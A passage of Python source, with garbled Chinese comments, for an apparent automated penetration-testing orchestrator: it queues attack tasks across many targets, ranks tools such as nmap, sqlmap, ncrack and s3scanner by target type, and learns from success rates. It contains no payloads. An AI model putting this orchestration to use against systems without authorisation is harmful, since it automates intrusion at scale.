    tool_name: str = ""
    parameters: Dict[str, Any] = field(default_factory=dict)
    strategy_context: str = ""
    priority: int = 1
    status: str = "queued"  # queued, running, completed, failed, paused
    dependencies: List[str] = field(default_factory=list)  # ä¾èµ–çš„å…¶ä»–ä»»åŠ¡ID
    estimated_duration: int = 30  # é¢„ä¼°æ‰§è¡Œæ—¶é—´ï¼ˆç§’ï¼‰
    retry_count: int = 0
    max_retries: int = 3
    created_at: datetime = field(default_factory=datetime.now)
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    result: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None

class MultiTargetOrchestrator:
    """å¤šç›®æ ‡åè°ƒæ”»å‡»ç¼–æ’å™¨"""

    def __init__(self):
        self.targets: Dict[str, TargetProfile] = {}
        self.attack_tasks: Dict[str, AttackTask] = {}
        self.task_queue: List[str] = []  # ä»»åŠ¡IDé˜Ÿåˆ—
        self.running_tasks: Dict[str, AttackTask] = {}
        self.completed_tasks: Dict[str, AttackTask] = {}
        self.failed_tasks: Dict[str, AttackTask] = {}

        # åè°ƒå‚æ•°
        self.max_concurrent_tasks = 5
        self.max_tasks_per_target = 3
        self.coordination_strategies = {
            "adaptive": self._adaptive_strategy
        }
        self.current_strategy = "adaptive"

        # æ€§èƒ½ç›‘æ§
        self.performance_metrics = {
            "total_targets": 0,
            "completed_targets": 0,
            "failed_targets": 0,
            "average_completion_time": 0,
            "success_rate": 0,
            "resource_utilization": 0
        }

    def add_target(self, target_url: str, target_type: str = "unknown",
                   priority: int = 1, dependencies: List[str] = None) -> str:
        """æ·»åŠ æ–°ç›®æ ‡åˆ°åè°ƒç³»ç»Ÿ"""
        target_id = f"target_{int(time.time())}_{random.randint(1000, 9999)}"

        target_profile = TargetProfile(
            target_id=target_id,
            target_url=target_url,
            target_type=target_type,
            priority=priority,
            dependency_targets=dependencies or []
        )

        self.targets[target_id] = target_profile
        self.performance_metrics["total_targets"] += 1

        return target_id

    def orchestrate_attack(self, strategy: str = None) -> Dict[str, Any]:
        """æ‰§è¡Œæ”»å‡»ç¼–æ’"""
        if strategy:
            self.current_strategy = strategy

        if self.current_strategy not in self.coordination_strategies:
            raise ValueError(f"æœªçŸ¥çš„åè°ƒç­–ç•¥: {self.current_strategy}")

        orchestration_plan = self.coordination_strategies[self.current_strategy]()

        return {
            "orchestration_strategy": self.current_strategy,
            "execution_plan": orchestration_plan,
            "targets_count": len(self.targets),
            "tasks_count": len(self.attack_tasks),
            "estimated_total_time": self._estimate_total_execution_time(orchestration_plan)
        }

    def _adaptive_strategy(self) -> Dict[str, Any]:
        """è‡ªé€‚åº”ç­–ç•¥ - æ ¹æ®ç›®æ ‡ç±»å‹å’Œä¾èµ–å…³ç³»åŠ¨æ€è°ƒæ•´"""
        execution_plan = []

        # åˆ†æç›®æ ‡ç±»å‹åˆ†å¸ƒ
        target_types = {}
        for target in self.targets.values():
            target_types[target.target_type] = target_types.get(target.target_type, 0) + 1

        # å¤„ç†ä¾èµ–å…³ç³»
        dependency_graph = self._build_dependency_graph()
        execution_order = self._topological_sort(dependency_graph)

        # ä¸ºæ¯ä¸ªæ‰§è¡Œé˜¶æ®µåˆ†é…ä»»åŠ¡
        for phase, target_ids in enumerate(execution_order):
            phase_tasks = []

            for target_id in target_ids:
                target_tasks = [task for task in self.attack_tasks.values()
                              if task.target_id == target_id and task.status == "queued"]

                # æ ¹æ®ç›®æ ‡ç±»å‹é€‰æ‹©æœ€ä½³å·¥å…·ç»„åˆ
                optimized_tasks = self._optimize_task_sequence(target_tasks, self.targets[target_id])
                phase_tasks.extend(optimized_tasks)

            if phase_tasks:
                execution_plan.append({
                    "phase": phase + 1,
                    "execution_mode": "adaptive",
                    "target_count": len(target_ids),
                    "tasks": [
                        {
                            "task_id": task.task_id,
                            "target_id": task.target_id,
                            "tool": task.tool_name,
                            "adaptation_reason": task.metadata.get("adaptation_reason", "ä¼˜åŒ–é€‰æ‹©"),
                            "estimated_duration": task.estimated_duration
                        } for task in phase_tasks
                    ]
                })

        return {"strategy": "adaptive", "execution_phases": execution_plan}

    def _build_dependency_graph(self) -> Dict[str, List[str]]:
        """æ„å»ºç›®æ ‡ä¾èµ–å›¾"""
        graph = {}
        for target_id, target in self.targets.items():
            graph[target_id] = target.dependency_targets
        return graph

    def _topological_sort(self, graph: Dict[str, List[str]]) -> List[List[str]]:
        """æ‹“æ‰‘æ’åºï¼Œè¿”å›æŒ‰ä¾èµ–å±‚çº§æ’åºçš„ç›®æ ‡ç»„"""
        in_degree = {node: 0 for node in graph}

        # è®¡ç®—å…¥åº¦
        for node in graph:
            for neighbor in graph[node]:
                if neighbor in in_degree:
                    in_degree[neighbor] += 1

        # æŒ‰å±‚çº§åˆ†ç»„
        levels = []
        remaining_nodes = set(graph.keys())

        while remaining_nodes:
            # æ‰¾åˆ°å½“å‰å±‚çº§çš„èŠ‚ç‚¹ï¼ˆå…¥åº¦ä¸º0ï¼‰
            current_level = [node for node in remaining_nodes if in_degree[node] == 0]
            if not current_level:
                break

            levels.append(current_level)

            # ç§»é™¤å½“å‰å±‚çº§çš„èŠ‚ç‚¹å¹¶æ›´æ–°å…¥åº¦
            for node in current_level:
                remaining_nodes.remove(node)
                for neighbor in graph[node]:
                    if neighbor in in_degree:
                        in_degree[neighbor] -= 1

        return levels

    def _optimize_task_sequence(self, tasks: List[AttackTask], target: TargetProfile) -> List[AttackTask]:
        """æ ¹æ®ç›®æ ‡ç‰¹å¾ä¼˜åŒ–ä»»åŠ¡åºåˆ—"""
        optimization_rules = {
            "web": ["nmap", "dirb", "nikto", "sqlmap", "xsser"],
            "network": ["nmap", "masscan", "zmap", "ncrack"],
            "mobile": ["apktool", "jadx", "frida"],
            "cloud": ["cloudenum", "s3scanner", "awscli"]
        }

        preferred_order = optimization_rules.get(target.target_type, [])
        optimized_tasks = []

        # é¦–å…ˆæ·»åŠ æŒ‰ä¼˜å…ˆé¡ºåºæ’åˆ—çš„å·¥å…·
        for tool_name in preferred_order:
            matching_tasks = [task for task in tasks if task.tool_name == tool_name]
            optimized_tasks.extend(matching_tasks)

        # æ·»åŠ å…¶ä»–ä»»åŠ¡
        remaining_tasks = [task for task in tasks if task not in optimized_tasks]
        remaining_tasks.sort(key=lambda t: t.priority, reverse=True)
        optimized_tasks.extend(remaining_tasks)

        return optimized_tasks

    def _estimate_total_execution_time(self, orchestration_plan: Dict[str, Any]) -> int:
        """ä¼°ç®—æ€»æ‰§è¡Œæ—¶é—´"""
        total_time = 0
        phases = orchestration_plan.get("execution_phases", [])

        for phase in phases:
            phase_tasks = phase.get("tasks", [])
            if phase_tasks:
                # å‡è®¾é˜¶æ®µå†…ä»»åŠ¡å¯ä»¥éƒ¨åˆ†å¹¶è¡Œ
                phase_time = max([task.get("estimated_duration", 30) for task in phase_tasks] or [0])
                total_time += phase_time

        return total_time

    def get_orchestration_status(self) -> Dict[str, Any]:
        """è·å–ç¼–æ’çŠ¶æ€"""
        total_tasks = len(self.attack_tasks)
        running_count = len(self.running_tasks)
        completed_count = len(self.completed_tasks)
        failed_count = len(self.failed_tasks)
        queued_count = len([task for task in self.attack_tasks.values() if task.status == "queued"])

        return {
            "total_targets": len(self.targets),
            "active_targets": len([t for t in self.targets.values() if t.status == "active"]),
            "completed_targets": len([t for t in self.targets.values() if t.status == "completed"]),
            "total_tasks": total_tasks,
            "queued_tasks": queued_count,
            "running_tasks": running_count,
            "completed_tasks": completed_count,
            "failed_tasks": failed_count,
            "success_rate": (completed_count / total_tasks * 100) if total_tasks > 0 else 0,
            "current_strategy": self.current_strategy,
            "resource_utilization": (running_count / self.max_concurrent_tasks * 100) if self.max_concurrent_tasks > 0 else 0,
            "performance_metrics": self.performance_metrics
        }

# å…¨å±€å¤šç›®æ ‡ç¼–æ’å™¨å®ä¾‹
multi_target_orchestrator = MultiTargetOrchestrator()

# ==================== é«˜çº§ä¸Šä¸‹æ–‡å…³è”å’Œæ¨¡å¼è¯†åˆ«ç³»ç»Ÿ ====================

@dataclass
class ContextPattern:
    """ä¸Šä¸‹æ–‡æ¨¡å¼æ•°æ®ç±»"""
    pattern_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    pattern_name: str = ""
    pattern_type: str = "behavioral"  # behavioral, structural, temporal, causal
    pattern_signature: Dict[str, Any] = field(default_factory=dict)
    occurrence_count: int = 0
    success_rate: float = 0.0
    associated_strategies: List[str] = field(default_factory=list)
    confidence_score: float = 0.0
    last_seen: datetime = field(default_factory=datetime.now)
    metadata: Dict[str, Any] = field(default_factory=dict)

class AdvancedContextAnalyzer:
    """é«˜çº§ä¸Šä¸‹æ–‡å…³è”å’Œæ¨¡å¼è¯†åˆ«åˆ†æå™¨"""

    def __init__(self):
        self.pattern_repository: Dict[str, ContextPattern] = {}
        self.behavioral_sequences: List[List[Dict[str, Any]]] = []

        # åˆ†æå‚æ•°
        self.min_pattern_confidence = 0.6
        self.min_correlation_strength = 0.7
        self.pattern_discovery_window = 100  # æœ€è¿‘100æ¬¡äº¤äº’

    def analyze_context_patterns(self, session_history: List[Dict[str, Any]],
                                current_context: Dict[str, Any]) -> Dict[str, Any]:
        """åˆ†æä¸Šä¸‹æ–‡æ¨¡å¼å’Œå…³è”"""
        analysis_results = {
            "discovered_patterns": [],
            "strong_correlations": [],
            "behavioral_insights": {},
            "predictive_recommendations": [],
            "confidence_metrics": {}
        }

        try:
            # 1. å‘ç°æ–°æ¨¡å¼
            new_patterns = self._discover_patterns(session_history, current_context)
            analysis_results["discovered_patterns"] = new_patterns

            # 2. åˆ†æä¸Šä¸‹æ–‡å…³è”
            correlations = self._analyze_correlations(session_history, current_context)
            analysis_results["strong_correlations"] = correlations

            # 3. æå–è¡Œä¸ºæ´å¯Ÿ
            behavioral_insights = self._extract_behavioral_insights(session_history)
            analysis_results["behavioral_insights"] = behavioral_insights

            # 4. ç”Ÿæˆé¢„æµ‹æ€§å»ºè®®
            recommendations = self._generate_predictive_recommendations(current_context, new_patterns, correlations)
            analysis_results["predictive_recommendations"] = recommendations

        except Exception as e:
            analysis_results["error"] = str(e)

        return analysis_results

    def _discover_patterns(self, session_history: List[Dict[str, Any]],
                          current_context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """å‘ç°æ–°çš„ä¸Šä¸‹æ–‡æ¨¡å¼"""
        discovered_patterns = []

        # åºåˆ—æ¨¡å¼å‘ç°
        sequence_patterns = self._discover_sequence_patterns(session_history)
        discovered_patterns.extend(sequence_patterns)

        # å·¥å…·ä½¿ç”¨æ¨¡å¼
        tool_patterns = self._discover_tool_usage_patterns(session_history)
        discovered_patterns.extend(tool_patterns)

        # æˆåŠŸ/å¤±è´¥æ¨¡å¼
        outcome_patterns = self._discover_outcome_patterns(session_history)
        discovered_patterns.extend(outcome_patterns)

        # æ›´æ–°æ¨¡å¼åº“
        for pattern in discovered_patterns:
            self._update_pattern_repository(pattern)

        return discovered_patterns

    def _discover_sequence_patterns(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """å‘ç°åºåˆ—æ¨¡å¼"""
        patterns = []

        if len(session_history) < 3:
            return patterns

        # åˆ†æå·¥å…·è°ƒç”¨åºåˆ—
        tool_sequences = []
        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            if tools_used:
                tool_sequences.extend(tools_used)

        # æŸ¥æ‰¾é¢‘ç¹åºåˆ—
        frequent_sequences = self._find_frequent_sequences(tool_sequences, min_length=2, min_support=2)

        for sequence, support in frequent_sequences:
            pattern = {
                "pattern_name": f"tool_sequence_{'-'.join(sequence)}",
                "pattern_type": "sequential",
                "pattern_signature": {
                    "sequence": sequence,
                    "support": support,
                    "length": len(sequence)
                },
                "confidence_score": min(support / len(session_history), 1.0)
            }
            patterns.append(pattern)

        return patterns

    def _discover_tool_usage_patterns(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """å‘ç°å·¥å…·ä½¿ç”¨æ¨¡å¼"""
        patterns = []

        # ç»Ÿè®¡å·¥å…·ä½¿ç”¨é¢‘ç‡
        tool_usage = {}
        tool_success_rate = {}

        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            success_indicators = entry.get("success_indicators", {})

            for tool in tools_used:
                tool_usage[tool] = tool_usage.get(tool, 0) + 1

                # è®¡ç®—æˆåŠŸç‡
                if tool not in tool_success_rate:
                    tool_success_rate[tool] = {"success": 0, "total": 0}

                tool_success_rate[tool]["total"] += 1
                if success_indicators.get(tool, False):
                    tool_success_rate[tool]["success"] += 1

        # è¯†åˆ«é«˜æ•ˆå·¥å…·ç»„åˆ
        for tool, usage_count in tool_usage.items():
            if usage_count >= 3:  # è‡³å°‘ä½¿ç”¨3æ¬¡
                success_rate = tool_success_rate[tool]["success"] / tool_success_rate[tool]["total"]

                if success_rate > 0.7:  # æˆåŠŸç‡å¤§äº70%
                    pattern = {
                        "pattern_name": f"effective_tool_{tool}",
                        "pattern_type": "tool_effectiveness",
                        "pattern_signature": {
                            "tool": tool,
                            "usage_count": usage_count,
                            "success_rate": success_rate
                        },
                        "confidence_score": success_rate
                    }
                    patterns.append(pattern)

        return patterns

    def _discover_outcome_patterns(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """å‘ç°ç»“æœæ¨¡å¼"""
        patterns = []

        # åˆ†ææˆåŠŸå’Œå¤±è´¥çš„ä¸Šä¸‹æ–‡
        success_contexts = []
        failure_contexts = []

        for entry in session_history:
            outcome = entry.get("outcome", "unknown")
            context_features = self._extract_context_features(entry)

            if outcome == "success":
                success_contexts.append(context_features)
            elif outcome == "failure":
                failure_contexts.append(context_features)

        # è¯†åˆ«æˆåŠŸæ¨¡å¼
        if len(success_contexts) >= 2:
            success_pattern = self._identify_common_features(success_contexts)
            if success_pattern:
                pattern = {
                    "pattern_name": "success_context_pattern",
                    "pattern_type": "outcome_success",
                    "pattern_signature": success_pattern,
                    "confidence_score": len(success_contexts) / max(len(session_history), 1)
                }
                patterns.append(pattern)

        return patterns

    def _analyze_correlations(self, session_history: List[Dict[str, Any]],
                             current_context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """åˆ†æä¸Šä¸‹æ–‡å…³è”"""
        correlations = []

        # å·¥å…·-ç»“æœå…³è”
        tool_outcome_correlations = self._analyze_tool_outcome_correlations(session_history)
        correlations.extend(tool_outcome_correlations)

        return correlations

    def _analyze_tool_outcome_correlations(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """åˆ†æå·¥å…·ä¸ç»“æœçš„å…³è”"""
        correlations = []

        # ç»Ÿè®¡å·¥å…·å’Œç»“æœçš„å…±ç°
        tool_outcome_matrix = {}

        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            outcome = entry.get("outcome", "unknown")

            for tool in tools_used:
                if tool not in tool_outcome_matrix:
                    tool_outcome_matrix[tool] = {"success": 0, "failure": 0, "unknown": 0}
                tool_outcome_matrix[tool][outcome] += 1

        # è®¡ç®—å…³è”å¼ºåº¦
        for tool, outcomes in tool_outcome_matrix.items():
            total = sum(outcomes.values())
            if total >= 3:  # è‡³å°‘3æ¬¡è§‚å¯Ÿ
                success_rate = outcomes["success"] / total

                if success_rate > 0.8 or success_rate < 0.2:  # å¼ºå…³è”
                    correlation = {
                        "correlation_type": "tool_outcome",
                        "source": tool,
                        "target": "success" if success_rate > 0.5 else "failure",
                        "correlation_strength": abs(success_rate - 0.5) * 2,
                        "evidence_count": total
                    }
                    correlations.append(correlation)

        return correlations

    def _extract_behavioral_insights(self, session_history: List[Dict[str, Any]]) -> Dict[str, Any]:
        """æå–è¡Œä¸ºæ´å¯Ÿ"""
        insights = {
            "total_interactions": len(session_history),
            "tool_diversity": 0,
            "success_rate": 0,
            "common_patterns": []
        }

        if not session_history:
            return insights

        # è®¡ç®—å·¥å…·å¤šæ ·æ€§
        all_tools = set()
        success_count = 0

        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            all_tools.update(tools_used)

            if entry.get("outcome") == "success":
                success_count += 1

        insights["tool_diversity"] = len(all_tools)
        insights["success_rate"] = success_count / len(session_history)

        return insights

    def _generate_predictive_recommendations(self, current_context: Dict[str, Any],
                                           patterns: List[Dict[str, Any]],
                                           correlations: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """ç”Ÿæˆé¢„æµ‹æ€§å»ºè®®"""
        recommendations = []

        # åŸºäºæ¨¡å¼çš„å»ºè®®
        for pattern in patterns:
            if pattern.get("confidence_score", 0) > 0.7:
                recommendation = {
                    "type": "pattern_based",
                    "suggestion": f"æ ¹æ®æ¨¡å¼ {pattern['pattern_name']}ï¼Œå»ºè®®ç»§ç»­ä½¿ç”¨ç›¸å…³ç­–ç•¥",
                    "confidence": pattern.get("confidence_score", 0),
                    "reasoning": f"è¯¥æ¨¡å¼åœ¨å†å²ä¸­è¡¨ç°è‰¯å¥½ï¼Œç½®ä¿¡åº¦ä¸º {pattern.get('confidence_score', 0):.2f}"
                }
                recommendations.append(recommendation)

        # åŸºäºå…³è”çš„å»ºè®®
        for correlation in correlations:
            if correlation.get("correlation_strength", 0) > 0.8:
                recommendation = {
                    "type": "correlation_based",
                    "suggestion": f"æ¨èä½¿ç”¨å·¥å…· {correlation['source']}",
                    "confidence": correlation.get("correlation_strength", 0),
                    "reasoning": f"è¯¥å·¥å…·ä¸æˆåŠŸç»“æœæœ‰å¼ºå…³è”æ€§ï¼Œå…³è”å¼ºåº¦ä¸º {correlation.get('correlation_strength', 0):.2f}"
                }
                recommendations.append(recommendation)

        return recommendations

    def _find_frequent_sequences(self, sequences: List[str], min_length: int = 2, min_support: int = 2) -> List[tuple]:
        """æŸ¥æ‰¾é¢‘ç¹åºåˆ—"""
        from collections import defaultdict

        if len(sequences) < min_length:
            return []

        # ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„å­åºåˆ—
        subsequences = defaultdict(int)

        for i in range(len(sequences) - min_length + 1):
            for length in range(min_length, min(len(sequences) - i + 1, 5)):  # æœ€å¤§é•¿åº¦ä¸º5
                subseq = tuple(sequences[i:i + length])
                subsequences[subseq] += 1

        # ç­›é€‰é¢‘ç¹åºåˆ—
        frequent = [(seq, count) for seq, count in subsequences.items() if count >= min_support]
        frequent.sort(key=lambda x: x[1], reverse=True)

        return frequent[:10]  # è¿”å›å‰10ä¸ªæœ€é¢‘ç¹çš„åºåˆ—

    def _extract_context_features(self, entry: Dict[str, Any]) -> Dict[str, Any]:
        """æå–ä¸Šä¸‹æ–‡ç‰¹å¾"""
        features = {}

        # æå–å…³é”®ç‰¹å¾
        features["tools_used"] = entry.get("tools_used", [])
        features["target_type"] = entry.get("target_type", "unknown")
        features["strategy"] = entry.get("strategy", "unknown")
        features["session_depth"] = entry.get("session_depth", 0)

        return features

    def _identify_common_features(self, contexts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """è¯†åˆ«å…±åŒç‰¹å¾"""
        if not contexts:
            return {}

        common_features = {}

        # æŸ¥æ‰¾åœ¨å¤šæ•°ä¸Šä¸‹æ–‡ä¸­å‡ºç°çš„ç‰¹å¾
        for feature_name in contexts[0].keys():
            feature_values = [ctx.get(feature_name) for ctx in contexts if feature_name in ctx]

            if len(set(str(v) for v in feature_values)) == 1:  # æ‰€æœ‰å€¼éƒ½ç›¸åŒ
                common_features[feature_name] = feature_values[0]

        return common_features if common_features else None

    def _update_pattern_repository(self, pattern: Dict[str, Any]):
        """æ›´æ–°æ¨¡å¼åº“"""
        pattern_name = pattern.get("pattern_name", "unknown")

        if pattern_name in self.pattern_repository:
            # æ›´æ–°ç°æœ‰æ¨¡å¼
            existing = self.pattern_repository[pattern_name]
            existing.occurrence_count += 1
            existing.last_seen = datetime.now()
            # æ›´æ–°ç½®ä¿¡åº¦ï¼ˆç§»åŠ¨å¹³å‡ï¼‰
            existing.confidence_score = (existing.confidence_score * 0.8 +
                                       pattern.get("confidence_score", 0) * 0.2)
        else:
            # åˆ›å»ºæ–°æ¨¡å¼
            new_pattern = ContextPattern(
                pattern_name=pattern_name,
                pattern_type=pattern.get("pattern_type", "unknown"),
                pattern_signature=pattern.get("pattern_signature", {}),
                occurrence_count=1,
                confidence_score=pattern.get("confidence_score", 0)
            )
            self.pattern_repository[pattern_name] = new_pattern

# å…¨å±€é«˜çº§ä¸Šä¸‹æ–‡åˆ†æå™¨å®ä¾‹
advanced_context_analyzer = AdvancedContextAnalyzer()

# ==================== æ”»å‡»æ™ºèƒ½çŸ¥è¯†å›¾è°±ç³»ç»Ÿ ====================

@dataclass
class KnowledgeNode:
    """çŸ¥è¯†å›¾è°±èŠ‚ç‚¹æ•°æ®ç±»"""
    node_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    node_type: str = ""  # target, tool, vulnerability, technique, strategy
    node_name: str = ""
    properties: Dict[str, Any] = field(default_factory=dict)
    confidence_score: float = 0.0
    created_at: datetime = field(default_factory=datetime.now)
    last_updated: datetime = field(default_factory=datetime.now)
    tags: List[str] = field(default_factory=list)

@dataclass
class KnowledgeRelation:
    """çŸ¥è¯†å›¾è°±å…³ç³»æ•°æ®ç±»"""
    relation_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    source_node_id: str = ""
    target_node_id: str = ""
    relation_type: str = ""  # affects, requires, enables, counters, similar_to
    relation_strength: float = 0.0
    evidence_count: int = 0
    properties: Dict[str, Any] = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.now)

class AttackKnowledgeGraph:
    """æ”»å‡»æ™ºèƒ½çŸ¥è¯†å›¾è°±"""

    def __init__(self):
        self.nodes: Dict[str, KnowledgeNode] = {}
        self.relations: Dict[str, KnowledgeRelation] = {}
        self.node_index: Dict[str, List[str]] = {}  # æŒ‰ç±»å‹ç´¢å¼•èŠ‚ç‚¹
        self.relation_index: Dict[str, List[str]] = {}  # æŒ‰ç±»å‹ç´¢å¼•å…³ç³»

        # å›¾è°±å‚æ•°
        self.min_relation_strength = 0.3
        self.max_nodes_per_type = 1000

        # é¢„å®šä¹‰çŸ¥è¯†
        self._initialize_base_knowledge()

    def _initialize_base_knowledge(self):
        """åˆå§‹åŒ–åŸºç¡€æ”»å‡»çŸ¥è¯†"""
        # å¸¸è§ç›®æ ‡ç±»å‹
        target_types = [
            {"name": "Webåº”ç”¨", "properties": {"common_ports": [80, 443, 8080], "protocols": ["HTTP", "HTTPS"]}},
            {"name": "æ•°æ®åº“", "properties": {"common_ports": [3306, 5432, 1433], "protocols": ["MySQL", "PostgreSQL", "MSSQL"]}},
            {"name": "ç½‘ç»œè®¾å¤‡", "properties": {"common_ports": [22, 23, 161], "protocols": ["SSH", "Telnet", "SNMP"]}},
        ]

        for target_type in target_types:
            self.add_node("target_type", target_type["name"], target_type["properties"], confidence=0.9)

        # å¸¸è§å·¥å…·å’ŒæŠ€æœ¯
        tools_techniques = [
            {"tool": "nmap", "technique": "ç«¯å£æ‰«æ", "effectiveness": {"web": 0.9, "network": 0.95, "database": 0.8}},
            {"tool": "sqlmap", "technique": "SQLæ³¨å…¥", "effectiveness": {"web": 0.9, "database": 0.95, "network": 0.3}},
            {"tool": "dirb", "technique": "ç›®å½•æšä¸¾", "effectiveness": {"web": 0.85, "network": 0.2, "database": 0.1}},
        ]

        for item in tools_techniques:
            tool_node = self.add_node("tool", item["tool"], {"type": "penetration_testing"}, confidence=0.9)
            technique_node = self.add_node("technique", item["technique"], item["effectiveness"], confidence=0.9)
            self.add_relation(tool_node, technique_node, "implements", strength=0.9)

    def add_node(self, node_type: str, node_name: str, properties: Dict[str, Any] = None,
                 confidence: float = 0.5, tags: List[str] = None) -> str:
        """æ·»åŠ çŸ¥è¯†èŠ‚ç‚¹"""
        node = KnowledgeNode(
            node_type=node_type,
            node_name=node_name,
            properties=properties or {},
            confidence_score=confidence,
            tags=tags or []
        )

        self.nodes[node.node_id] = node

        # æ›´æ–°ç´¢å¼•
        if node_type not in self.node_index:
            self.node_index[node_type] = []
        self.node_index[node_type].append(node.node_id)

        return node.node_id

    def add_relation(self, source_node_id: str, target_node_id: str, relation_type: str,
                    strength: float = 0.5, properties: Dict[str, Any] = None) -> str:
        """æ·»åŠ çŸ¥è¯†å…³ç³»"""
        if source_node_id not in self.nodes or target_node_id not in self.nodes:
            raise ValueError("æºèŠ‚ç‚¹æˆ–ç›®æ ‡èŠ‚ç‚¹ä¸å­˜åœ¨")

        relation = KnowledgeRelation(
            source_node_id=source_node_id,
            target_node_id=target_node_id,
            relation_type=relation_type,
            relation_strength=strength,
            properties=properties or {},
            evidence_count=1
        )

        self.relations[relation.relation_id] = relation

        # æ›´æ–°ç´¢å¼•
        if relation_type not in self.relation_index:
            self.relation_index[relation_type] = []
        self.relation_index[relation_type].append(relation.relation_id)

        return relation.relation_id

    def query_nodes(self, node_type: str = None, name_pattern: str = None,
                   min_confidence: float = 0.0) -> List[Dict[str, Any]]:
        """æŸ¥è¯¢çŸ¥è¯†èŠ‚ç‚¹"""
        results = []

        target_nodes = []
        if node_type:
            target_nodes = [self.nodes[nid] for nid in self.node_index.get(node_type, [])]
        else:
            target_nodes = list(self.nodes.values())

        for node in target_nodes:
            if node.confidence_score >= min_confidence:
                if not name_pattern or name_pattern.lower() in node.node_name.lower():
                    results.append({
                        "node_id": node.node_id,
                        "node_type": node.node_type,
                        "node_name": node.node_name,
                        "properties": node.properties,
                        "confidence_score": node.confidence_score,
                        "tags": node.tags
                    })

        return results

    def recommend_tools_for_target(self, target_properties: Dict[str, Any]) -> List[Dict[str, Any]]:
        """æ ¹æ®ç›®æ ‡ç‰¹å¾æ¨èå·¥å…·"""
        recommendations = []

        # æŸ¥æ‰¾å·¥å…·èŠ‚ç‚¹
        tool_nodes = self.query_nodes(node_type="tool")

        for tool in tool_nodes:
            tool_id = tool["node_id"]

            # è®¡ç®—åŒ¹é…åº¦
            effectiveness_score = self._calculate_tool_effectiveness(target_properties, tool["properties"])

            if effectiveness_score > 0.3:  # æœ€ä½æœ‰æ•ˆæ€§é˜ˆå€¼
                recommendations.append({
                    "tool_name": tool["node_name"],
                    "tool_id": tool_id,
                    "effectiveness_score": effectiveness_score,
                    "confidence": tool["confidence_score"],
                    "reasoning": self._generate_recommendation_reasoning(target_properties, tool["properties"])
                })

        # æŒ‰æ•ˆæœè¯„åˆ†æ’åº
        recommendations.sort(key=lambda x: x["effectiveness_score"], reverse=True)

        return recommendations[:10]  # è¿”å›å‰10ä¸ªæ¨è

    def _calculate_tool_effectiveness(self, target_props: Dict[str, Any],
                                    tool_props: Dict[str, Any]) -> float:
        """è®¡ç®—å·¥å…·å¯¹ç›®æ ‡çš„æœ‰æ•ˆæ€§"""
        # æ ¹æ®ç›®æ ‡ç±»å‹è®¡ç®—åŸºç¡€æœ‰æ•ˆæ€§
        target_type = target_props.get("type", "unknown")

        # é»˜è®¤åŸºç¡€æœ‰æ•ˆæ€§
        effectiveness = 0.5

        # æ ¹æ®å·¥å…·ç±»å‹è°ƒæ•´
        if tool_props.get("type") == "penetration_testing":
            effectiveness = 0.7

        return min(effectiveness, 1.0)

    def _generate_recommendation_reasoning(self, target_props: Dict[str, Any],
                                         tool_props: Dict[str, Any]) -> str:
        """ç”Ÿæˆæ¨èç†ç”±"""
        target_type = target_props.get("type", "æœªçŸ¥")
        return f"é€‚ç”¨äº {target_type} ç±»å‹ç›®æ ‡çš„æ¸—é€æµ‹è¯•å·¥å…·"

    def get_knowledge_statistics(self) -> Dict[str, Any]:
        """è·å–çŸ¥è¯†å›¾è°±ç»Ÿè®¡ä¿¡æ¯"""
        stats = {
            "total_nodes": len(self.nodes),
            "total_relations": len(self.relations),
            "nodes_by_type": {},
            "relations_by_type": {},
            "average_confidence": 0.0
        }

        # ç»Ÿè®¡èŠ‚ç‚¹ç±»å‹
        for node_type, node_ids in self.node_index.items():
            stats["nodes_by_type"][node_type] = len(node_ids)

        # ç»Ÿè®¡å…³ç³»ç±»å‹
        for relation_type, relation_ids in self.relation_index.items():
            stats["relations_by_type"][relation_type] = len(relation_ids)

        # è®¡ç®—å¹³å‡ç½®ä¿¡åº¦
        if self.nodes:
            total_confidence = sum(node.confidence_score for node in self.nodes.values())
            stats["average_confidence"] = total_confidence / len(self.nodes)

        return stats

# å…¨å±€æ”»å‡»çŸ¥è¯†å›¾è°±å®ä¾‹
attack_knowledge_graph = AttackKnowledgeGraph()

# ==================== è‡ªé€‚åº”æ‰§è¡Œå¼•æ“ä¸åŠ¨æ€ç­–ç•¥åˆ‡æ¢ç³»ç»Ÿ ====================

@dataclass
class ExecutionContext:
    """æ‰§è¡Œä¸Šä¸‹æ–‡æ•°æ®ç±»"""
    context_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str = ""
    current_strategy: str = ""
    target_info: Dict[str, Any] = field(default_factory=dict)
    execution_state: str = "idle"  # idle, planning, executing, evaluating, switching
    performance_metrics: Dict[str, float] = field(default_factory=dict)
    adaptation_history: List[Dict[str, Any]] = field(default_factory=list)
    created_at: datetime = field(default_factory=datetime.now)
    last_updated: datetime = field(default_factory=datetime.now)

class AdaptiveExecutionEngine:
    """è‡ªé€‚åº”æ‰§è¡Œå¼•æ“"""

    def __init__(self):
        self.execution_contexts: Dict[str, ExecutionContext] = {}
        self.active_contexts: Set[str] = set()

        # æ‰§è¡Œå‚æ•°
        self.adaptation_threshold = 0.3  # ç­–ç•¥åˆ‡æ¢é˜ˆå€¼
        self.max_execution_time = 300  # æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼ˆç§’ï¼‰

        # ç­–ç•¥æ€§èƒ½å†å²
        self.strategy_performance_history: Dict[str, List[float]] = {}

    def create_execution_context(self, session_id: str, target_info: Dict[str, Any],
                                initial_strategy: str = "auto") -> str:
        """åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡"""
        context = ExecutionContext(
            session_id=session_id,
